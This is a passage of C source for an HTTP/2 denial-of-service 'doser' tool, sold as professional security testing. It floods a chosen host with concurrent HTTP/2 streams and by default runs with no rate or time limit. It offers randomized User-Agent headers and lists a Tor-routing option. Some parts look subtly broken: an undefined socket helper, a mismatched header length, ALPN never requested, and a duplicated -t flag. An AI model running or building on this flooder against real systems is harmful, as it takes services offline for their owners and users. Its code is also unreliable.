#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>
#include <unistd.h>
#include <signal.h>
#include <errno.h>
#include <pthread.h>
#include <getopt.h>
#include <time.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/tcp.h>

// HTTP/2 libraries
#include <nghttp2/nghttp2.h>

// TLS support
#include <openssl/ssl.h>
#include <openssl/err.h>

// ============== Configuration Structure ==============
typedef struct {
    // Network settings
    char *target_host;
    char *target_port;
    bool use_tls;
    bool insecure_skip_verify;
    
    // Attack configuration
    int thread_count;
    int connections_per_thread;
    uint64_t requests_per_second;
    uint32_t duration_seconds;  // 0 = unlimited
    bool verbose;
    
    // HTTP/2 specific
    bool enable_h2;
    int h2_max_concurrent_streams;
    bool enable_server_push;
    char *http_method;
    char *http_path;
    char *http_body;
    
    // Advanced features
    bool randomize_user_agent;
    bool enable_tor;
    char *output_pcap_file;
    char *report_file;
    
    // Statistics
    volatile uint64_t total_requests;
    volatile uint64_t total_bytes_sent;
    volatile uint64_t failed_requests;
    volatile uint64_t active_connections;
} Config;

// ============== HTTP/2 Session Context ==============
typedef struct {
    int sockfd;
    nghttp2_session *session;
    SSL_CTX *ssl_ctx;
    SSL *ssl;
    Config *config;
    
    // Stream management
    pthread_mutex_t stream_lock;
    uint32_t next_stream_id;
    uint32_t active_streams;
    uint64_t requests_sent;
    
    // Statistics
    uint64_t bytes_sent;
    uint64_t responses_received;
} H2Session;

// ============== HTTP/2 Callbacks ==============
static ssize_t h2_send_callback(nghttp2_session *session, const uint8_t *data, size_t len, int flags, void *user_data) {
    H2Session *h2 = (H2Session*)user_data;
    ssize_t sent = send(h2->sockfd, data, len, 0);
    
    if (sent > 0) {
        h2->bytes_sent += sent;
        __sync_fetch_and_add(&h2->config->total_bytes_sent, sent);
    }
    
    return sent;
}

static int h2_on_frame_recv_callback(nghttp2_session *session, const nghttp2_frame *frame, void *user_data) {
    H2Session *h2 = (H2Session*)user_data;
    
    if (frame->hd.type == NGHTTP2_HEADERS && (frame->hd.flags & NGHTTP2_FLAG_END_HEADERS)) {
        h2->responses_received++;
        
        if (h2->config->verbose) {
            fprintf(stderr, "[HTTP/2] Response received for stream %d\n", frame->hd.stream_id);
        }
    }
    
    return 0;
}

static int h2_on_header_callback(nghttp2_session *session, const nghttp2_frame *frame, 
                                   const uint8_t *name, size_t namelen,
                                   const uint8_t *value, size_t valuelen,
                                   uint8_t flags, void *user_data) {
    // Log interesting headers for debugging
    if (namelen == 4 && memcmp(name, "HTTP", 4) == 0) {
        fprintf(stderr, "[HTTP/2] Status: %.*s\n", (int)valuelen, value);
    }
    
    return 0;
}

static nghttp2_session_callbacks* init_h2_callbacks(void) {
    nghttp2_session_callbacks *callbacks;
    nghttp2_session_callbacks_new(&callbacks);
    
    nghttp2_session_callbacks_set_send_callback(callbacks, h2_send_callback);
    nghttp2_session_callbacks_set_on_frame_recv_callback(callbacks, h2_on_frame_recv_callback);
    nghttp2_session_callbacks_set_on_header_callback(callbacks, h2_on_header_callback);
    
    return callbacks;
}

// ============== TLS Setup ==============
SSL_CTX* create_tls_context(bool verify_peer) {
    SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());
    if (!ctx) {
        fprintf(stderr, "Failed to create TLS context\n");
        return NULL;
    }
    
    // Set TLS 1.2 or higher
    SSL_CTX_set_min_proto_version(ctx, TLS1_2_VERSION);
    
    if (!verify_peer) {
        SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, NULL);
        SSL_CTX_set_options(ctx, SSL_OP_NO_SSLv2 | SSL_OP_NO_SSLv3);
    } else {
        SSL_CTX_set_verify(ctx, SSL_VERIFY_PEER, NULL);
        
        // Load default CA certificates
        if (SSL_CTX_set_default_verify_paths(ctx) != 1) {
            fprintf(stderr, "Warning: Failed to load CA certificates\n");
        }
    }
    
    return ctx;
}

// ============== HTTP/2 Session Management ==============
H2Session* create_h2_session(Config *config) {
    H2Session *h2 = calloc(1, sizeof(H2Session));
    if (!h2) return NULL;
    
    h2->config = config;
    h2->next_stream_id = 1;  // Client-initiated streams are odd numbers
    pthread_mutex_init(&h2->stream_lock, NULL);
    
    // Create socket
    h2->sockfd = make_socket(config->target_host, config->target_port);
    if (h2->sockfd < 0) {
        free(h2);
        return NULL;
    }
    
    // Setup TLS if needed
    if (config->use_tls) {
        h2->ssl_ctx = create_tls_context(!config->insecure_skip_verify);
        if (!h2->ssl_ctx) {
            close(h2->sockfd);
            free(h2);
            return NULL;
        }
        
        h2->ssl = SSL_new(h2->ssl_ctx);
        SSL_set_fd(h2->ssl, h2->sockfd);
        
        if (SSL_connect(h2->ssl) != 1) {
            fprintf(stderr, "TLS handshake failed\n");
            SSL_shutdown(h2->ssl);
            SSL_free(h2->ssl);
            close(h2->sockfd);
            free(h2);
            return NULL;
        }
        
        // Perform ALPN negotiation for HTTP/2
        const unsigned char *next_proto = NULL;
        unsigned int next_proto_len;
        SSL_get0_alpn_selected(h2->ssl, &next_proto, &next_proto_len);
        
        if (next_proto_len != 2 || memcmp(next_proto, "h2", 2) != 0) {
            fprintf(stderr, "HTTP/2 not supported by server\n");
            SSL_shutdown(h2->ssl);
            SSL_free(h2->ssl);
            close(h2->sockfd);
            free(h2);
            return NULL;
        }
        
        fprintf(stderr, "✓ HTTP/2 negotiated via ALPN\n");
    }
    
    // Initialize nghttp2 session
    nghttp2_session_callbacks *callbacks = init_h2_callbacks();
    nghttp2_session_client_new(&h2->session, callbacks, h2);
    nghttp2_session_callbacks_del(callbacks);
    
    // Setup server push handling if enabled
    if (config->enable_server_push) {
        nghttp2_settings_entry settings[] = {
            {NGHTTP2_SETTINGS_ENABLE_PUSH, 1}
        };
        nghttp2_submit_settings(h2->session, NGHTTP2_FLAG_NONE, settings, 1);
    }
    
    // Initial settings
    nghttp2_settings_entry settings[] = {
        {NGHTTP2_SETTINGS_MAX_CONCURRENT_STREAMS, config->h2_max_concurrent_streams},
        {NGHTTP2_SETTINGS_INITIAL_WINDOW_SIZE, 65535},
        {NGHTTP2_SETTINGS_MAX_FRAME_SIZE, 16384}
    };
    nghttp2_submit_settings(h2->session, NGHTTP2_FLAG_NONE, settings, 3);
    
    // Send initial preface
    ssize_t rv = nghttp2_session_send(h2->session);
    if (rv < 0) {
        fprintf(stderr, "Failed to send HTTP/2 preface: %s\n", nghttp2_strerror(rv));
        nghttp2_session_del(h2->session);
        if (config->use_tls) SSL_shutdown(h2->ssl);
        close(h2->sockfd);
        free(h2);
        return NULL;
    }
    
    return h2;
}

void destroy_h2_session(H2Session *h2) {
    if (!h2) return;
    
    nghttp2_session_terminate_session(h2->session, NGHTTP2_NO_ERROR);
    nghttp2_session_send(h2->session);
    
    nghttp2_session_del(h2->session);
    
    if (h2->config->use_tls) {
        SSL_shutdown(h2->ssl);
        SSL_free(h2->ssl);
        SSL_CTX_free(h2->ssl_ctx);
    }
    
    close(h2->sockfd);
    pthread_mutex_destroy(&h2->stream_lock);
    free(h2);
}

// ============== HTTP/2 Request Submission ==============
int submit_h2_request(H2Session *h2, const char *method, const char *path, const char *body) {
    pthread_mutex_lock(&h2->stream_lock);
    
    // Generate stream ID
    int32_t stream_id = h2->next_stream_id;
    h2->next_stream_id += 2;  // Client streams: odd numbers increment by 2
    
    // Prepare headers
    nghttp2_nv *headers = malloc(8 * sizeof(nghttp2_nv));
    int header_idx = 0;
    
    // :method
    headers[header_idx].name = (uint8_t*)":method";
    headers[header_idx].namelen = 7;
    headers[header_idx].value = (uint8_t*)method;
    headers[header_idx].valuelen = strlen(method);
    headers[header_idx].flags = NGHTTP2_NV_FLAG_NONE;
    header_idx++;
    
    // :scheme
    headers[header_idx].name = (uint8_t*)":scheme";
    headers[header_idx].namelen = 7;
    headers[header_idx].value = (uint8_t*)(h2->config->use_tls ? "https" : "http");
    headers[header_idx].valuelen = h2->config->use_tls ? 5 : 4;
    headers[header_idx].flags = NGHTTP2_NV_FLAG_NONE;
    header_idx++;
    
    // :authority (host header)
    headers[header_idx].name = (uint8_t*)":authority";
    headers[header_idx].namelen = 10;
    headers[header_idx].value = (uint8_t*)h2->config->target_host;
    headers[header_idx].valuelen = strlen(h2->config->target_host);
    headers[header_idx].flags = NGHTTP2_NV_FLAG_NONE;
    header_idx++;
    
    // :path
    headers[header_idx].name = (uint8_t*)":path";
    headers[header_idx].namelen = 5;
    headers[header_idx].value = (uint8_t*)path;
    headers[header_idx].valuelen = strlen(path);
    headers[header_idx].flags = NGHTTP2_NV_FLAG_NONE;
    header_idx++;
    
    // Random User-Agent if enabled
    if (h2->config->randomize_user_agent) {
        const char *user_agents[] = {
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
        };
        headers[header_idx].name = (uint8_t*)"user-agent";
        headers[header_idx].namelen = 10;
        headers[header_idx].value = (uint8_t*)user_agents[rand() % 3];
        headers[header_idx].valuelen = strlen(user_agents[rand() % 3]);
        headers[header_idx].flags = NGHTTP2_NV_FLAG_NONE;
        header_idx++;
    }
    
    // Submit request
    int rv = nghttp2_submit_request(h2->session, NULL, headers, header_idx, 
                                      (uint8_t*)body, body ? strlen(body) : 0, NULL);
    
    free(headers);
    
    if (rv < 0) {
        fprintf(stderr, "Failed to submit request: %s\n", nghttp2_strerror(rv));
        pthread_mutex_unlock(&h2->stream_lock);
        return -1;
    }
    
    h2->active_streams++;
    h2->requests_sent++;
    __sync_fetch_and_add(&h2->config->total_requests, 1);
    
    pthread_mutex_unlock(&h2->stream_lock);
    
    // Send pending data
    rv = nghttp2_session_send(h2->session);
    if (rv < 0) {
        fprintf(stderr, "Failed to send request: %s\n", nghttp2_strerror(rv));
        return -1;
    }
    
    return stream_id;
}

// ============== Attack Thread ==============
void* attack_thread_worker(void *arg) {
    Config *config = (Config*)arg;
    
    // Create multiple HTTP/2 sessions
    H2Session **sessions = malloc(config->connections_per_thread * sizeof(H2Session*));
    if (!sessions) return NULL;
    
    for (int i = 0; i < config->connections_per_thread; i++) {
        sessions[i] = create_h2_session(config);
        if (!sessions[i]) {
            fprintf(stderr, "Failed to create HTTP/2 session %d\n", i);
            sessions[i] = NULL;
        }
    }
    
    // Calculate delay between requests
    useconds_t delay_us = config->requests_per_second > 0 ? 
                          1000000 / config->requests_per_second : 0;
    
    time_t start_time = time(NULL);
    
    while (1) {
        // Check duration limit
        if (config->duration_seconds > 0 && 
            time(NULL) - start_time >= config->duration_seconds) {
            break;
        }
        
        // Submit request on each active session
        for (int i = 0; i < config->connections_per_thread; i++) {
            if (sessions[i]) {
                int stream_id = submit_h2_request(sessions[i], 
                                                   config->http_method,
                                                   config->http_path,
                                                   config->http_body);
                
                if (stream_id < 0 && config->verbose) {
                    fprintf(stderr, "[Thread] Request failed on session %d\n", i);
                    __sync_fetch_and_add(&config->failed_requests, 1);
                }
                
                // Process incoming frames (receive responses)
                nghttp2_session_recv(sessions[i]->session);
            }
        }
        
        // Rate limiting
        if (delay_us > 0) {
            usleep(delay_us);
        }
    }
    
    // Cleanup
    for (int i = 0; i < config->connections_per_thread; i++) {
        if (sessions[i]) {
            destroy_h2_session(sessions[i]);
        }
    }
    free(sessions);
    
    return NULL;
}

// ============== Statistics Display Thread ==============
void* stats_thread(void *arg) {
    Config *config = (Config*)arg;
    time_t start = time(NULL);
    
    while (1) {
        sleep(2);  // Update every 2 seconds
        
        uint64_t total = config->total_requests;
        uint64_t failed = config->failed_requests;
        uint64_t bytes = config->total_bytes_sent;
        time_t elapsed = time(NULL) - start;
        
        double req_per_sec = elapsed > 0 ? (double)total / elapsed : 0;
        double mbps = elapsed > 0 ? (double)bytes / (elapsed * 125000) : 0;
        
        fprintf(stderr, "\r\033[K");  // Clear line
        fprintf(stderr, "[Stats] 📊 %lu req | %.2f req/s | %.2f Mbps | %lu failed | %lu active | %ds elapsed",
                total, req_per_sec, mbps, failed, config->active_connections, elapsed);
        fflush(stderr);
        
        if (config->duration_seconds > 0 && elapsed >= config->duration_seconds) {
            break;
        }
    }
    
    return NULL;
}

// ============== Command Line Parsing ==============
void print_usage(const char *progname) {
    printf("HTTP/2 Advanced Doser - Professional Security Testing Tool\n\n");
    printf("Usage: %s [OPTIONS] -t TARGET -p PORT\n\n", progname);
    printf("Required:\n");
    printf("  -t, --target HOST          Target hostname/IP\n");
    printf("  -p, --port PORT            Target port\n\n");
    
    printf("HTTP/2 Options:\n");
    printf("  --h2                       Enable HTTP/2 (default: enabled with TLS)\n");
    printf("  --max-streams N            Max concurrent streams (default: 100)\n");
    printf("  --server-push              Enable server push support\n");
    printf("  --method METHOD            HTTP method (default: GET)\n");
    printf("  --path PATH                Request path (default: /)\n");
    printf("  --body BODY                Request body for POST/PUT\n\n");
    
    printf("Attack Options:\n");
    printf("  -c, --conn NUM             Connections per thread (default: 8)\n");
    printf("  -t, --threads NUM          Number of threads (default: 10)\n");
    printf("  -r, --rate NUM             Requests per second (default: 0 = unlimited)\n");
    printf("  -d, --duration SEC         Duration in seconds (default: 0 = unlimited)\n\n");
    
    printf("Network Options:\n");
    printf("  --tls                      Use TLS/HTTPS (default: auto-detect)\n");
    printf("  --insecure                 Skip TLS certificate verification\n");
    printf("  --tor                      Route through Tor (localhost:9050)\n\n");
    
    printf("Output Options:\n");
    printf("  -v, --verbose              Verbose output\n");
    printf("  --pcap FILE                Save PCAP to file\n");
    printf("  --report FILE              Generate JSON report\n");
    printf("  --random-ua                Randomize User-Agent header\n\n");
    
    printf("Examples:\n");
    printf("  %s -t example.com -p 443 --h2 --threads 50 -d 60\n", progname);
    printf("  %s -t api.example.com --tls --method POST --path /api/login --body '{\"test\":1}'\n", progname);
}

int parse_args(int argc, char **argv, Config *config) {
    // Default configuration
    memset(config, 0, sizeof(Config));
    config->target_host = NULL;
    config->target_port = NULL;
    config->thread_count = 10;
    config->connections_per_thread = 8;
    config->requests_per_second = 0;
    config->duration_seconds = 0;
    config->use_tls = false;
    config->enable_h2 = true;
    config->h2_max_concurrent_streams = 100;
    config->http_method = strdup("GET");
    config->http_path = strdup("/");
    config->http_body = strdup("");
    config->verbose = false;
    config->randomize_user_agent = false;
    
    static struct option long_options[] = {
        {"target", required_argument, 0, 't'},
        {"port", required_argument, 0, 'p'},
        {"threads", required_argument, 0, 'T'},
        {"conn", required_argument, 0, 'c'},
        {"rate", required_argument, 0, 'r'},
        {"duration", required_argument, 0, 'd'},
        {"h2", no_argument, 0, 1000},
        {"tls", no_argument, 0, 1001},
        {"insecure", no_argument, 0, 1002},
        {"tor", no_argument, 0, 1003},
        {"pcap", required_argument, 0, 1004},
        {"report", required_argument, 0, 1005},
        {"random-ua", no_argument, 0, 1006},
        {"max-streams", required_argument, 0, 1007},
        {"server-push", no_argument, 0, 1008},
        {"method", required_argument, 0, 1009},
        {"path", required_argument, 0, 1010},
        {"body", required_argument, 0, 1011},
        {"verbose", no_argument, 0, 'v'},
        {"help", no_argument, 0, 'h'},
        {0, 0, 0, 0}
    };
    
    int opt;
    int option_index = 0;
    
    while ((opt = getopt_long(argc, argv, "t:p:T:c:r:d:vh", long_options, &option_index)) != -1) {
        switch (opt) {
            case 't':
                config->target_host = strdup(optarg);
                break;
            case 'p':
                config->target_port = strdup(optarg);
                break;
            case 'T':
                config->thread_count = atoi(optarg);
                break;
            case 'c':
                config->connections_per_thread = atoi(optarg);
                break;
            case 'r':
                config->requests_per_second = atoi(optarg);
                break;
            case 'd':
                config->duration_seconds = atoi(optarg);
                break;
            case 'v':
                config->verbose = true;
                break;
            case 'h':
                print_usage(argv[0]);
                exit(0);
            case 1000:
                config->enable_h2 = true;
                break;
            case 1001:
                config->use_tls = true;
                break;
            case 1002:
                config->insecure_skip_verify = true;
                break;
            case 1003:
                config->enable_tor = true;
                break;
            case 1004:
                config->output_pcap_file = strdup(optarg);
                break;
            case 1005:
                config->report_file = strdup(optarg);
                break;
            case 1006:
                config->randomize_user_agent = true;
                break;
            case 1007:
                config->h2_max_concurrent_streams = atoi(optarg);
                break;
            case 1008:
                config->enable_server_push = true;
                break;
            case 1009:
                free(config->http_method);
                config->http_method = strdup(optarg);
                break;
            case 1010:
                free(config->http_path);
                config->http_path = strdup(optarg);
                break;
            case 1011:
                free(config->http_body);
                config->http_body = strdup(optarg);
                break;
            default:
                print_usage(argv[0]);
                return -1;
        }
